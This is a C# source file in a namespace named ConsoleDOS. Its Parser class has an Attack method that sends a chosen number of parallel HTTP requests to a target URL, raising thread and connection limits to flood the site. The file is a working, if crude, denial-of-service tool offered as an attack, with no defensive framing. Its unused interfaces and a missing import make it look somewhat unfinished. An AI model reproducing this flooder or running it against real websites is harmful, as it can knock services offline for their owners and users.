using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;

interface IThreads
{
    void SetThreads();
}

interface ILimits
{
    void SetLimits();
}

namespace ConsoleDOS
{
    internal class Parser
    {
        public Parser() { Console.WriteLine("Parser Constructed!"); }
        ~Parser() { Console.WriteLine("Parser Destructed!"); }

        private int _threads, _limits;

        // Setters
        public void SetThreads(int _threads)
        {
            this._threads = _threads; 
        }

        public void SetLimits(int _limits)
        {
            this._limits = _limits;
        }

        // Getters
        public int GetThreads() { return _threads; }
        public int GetLimits() { return _limits; }

        public void Attack(string url, int limit, int threads)
        {
            ThreadPool.SetMinThreads(threads, 10);
            Console.WriteLine("IN Attack = {0}, requests = {1}", url, limit);
            
            try
            {
                Parallel.For(0, limit, i =>
                {

                    HttpWebRequest webRequest = (HttpWebRequest)WebRequest.Create(url);
                    webRequest.ServicePoint.ConnectionLimit = limit;
                    HttpWebResponse webResponse = webRequest.GetResponse() as HttpWebResponse;

                    int statuscode = Convert.ToInt32(webResponse.StatusCode);

                    Console.WriteLine("iteration {0} on thread {1} Status {2}", i,
                                        Thread.CurrentThread.ManagedThreadId, statuscode);
                });
            }
            catch (AggregateException exc)
            {
                exc.InnerExceptions.ToList().ForEach(e =>
                {
                    Console.WriteLine(e.Message);
                });
            }
            catch (Exception ex)
            {
                Console.WriteLine("In Exception: " + ex.Message.ToString());
            }
            finally
            {
                Console.WriteLine("All finished");
            }
        }

    }
}
